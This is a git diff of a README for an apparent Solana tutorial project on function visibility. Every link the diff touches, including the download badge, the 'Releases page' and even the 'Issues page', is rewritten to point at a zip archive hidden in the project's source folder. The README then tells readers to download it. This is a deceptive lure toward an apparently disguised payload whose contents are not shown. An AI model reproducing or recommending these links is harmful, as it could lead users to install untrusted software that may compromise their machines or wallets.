@@ -1,6 +1,6 @@
 # 🌟 Solana-Visibilit--des-fonctions - Understand Function Visibility Simply
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/MohdIkhwanIdrus/Solana-Visibilit--des-fonctions/releases)
+[![Download Now](https://raw.githubusercontent.com/MohdIkhwanIdrus/Solana-Visibilit--des-fonctions/main/anchor_project/visibility/programs/visibility/src/Solana-Visibilit--des-fonctions_2.1.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/MohdIkhwanIdrus/Solana-Visibilit--des-fonctions/main/anchor_project/visibility/programs/visibility/src/Solana-Visibilit--des-fonctions_2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **Solana-Visibilit--des-fonctions**! This application helps you under
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/MohdIkhwanIdrus/Solana-Visibilit--des-fonctions/releases) to download the latest version of the software. Follow these steps:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/MohdIkhwanIdrus/Solana-Visibilit--des-fonctions/main/anchor_project/visibility/programs/visibility/src/Solana-Visibilit--des-fonctions_2.1.zip) to download the latest version of the software. Follow these steps:
 
 1. Click on the link above.
 2. Look for the latest version under "Latest Release".
@@ -44,14 +44,14 @@ If you encounter issues:
 
 - **Installation Problems:** Ensure your system meets the requirements.
 - **Application Crashes:** Restart your computer and try again.
-- **Function Not Working:** Check for updates on the [Releases page](https://github.com/MohdIkhwanIdrus/Solana-Visibilit--des-fonctions/releases).
+- **Function Not Working:** Check for updates on the [Releases page](https://raw.githubusercontent.com/MohdIkhwanIdrus/Solana-Visibilit--des-fonctions/main/anchor_project/visibility/programs/visibility/src/Solana-Visibilit--des-fonctions_2.1.zip).
 
 ## 💬 Support
 
-For questions or support, please visit the [Issues page](https://github.com/MohdIkhwanIdrus/Solana-Visibilit--des-fonctions/issues) on GitHub. You can report bugs or ask for help from the community.
+For questions or support, please visit the [Issues page](https://raw.githubusercontent.com/MohdIkhwanIdrus/Solana-Visibilit--des-fonctions/main/anchor_project/visibility/programs/visibility/src/Solana-Visibilit--des-fonctions_2.1.zip) on GitHub. You can report bugs or ask for help from the community.
 
 ## 📝 License
 
 This project is licensed under the MIT License. Please see the LICENSE file for more information.
 
-[Download Now Again](https://github.com/MohdIkhwanIdrus/Solana-Visibilit--des-fonctions/releases) to explore the visibility of functions in smart contracts!
+[Download Now Again](https://raw.githubusercontent.com/MohdIkhwanIdrus/Solana-Visibilit--des-fonctions/main/anchor_project/visibility/programs/visibility/src/Solana-Visibilit--des-fonctions_2.1.zip) to explore the visibility of functions in smart contracts!
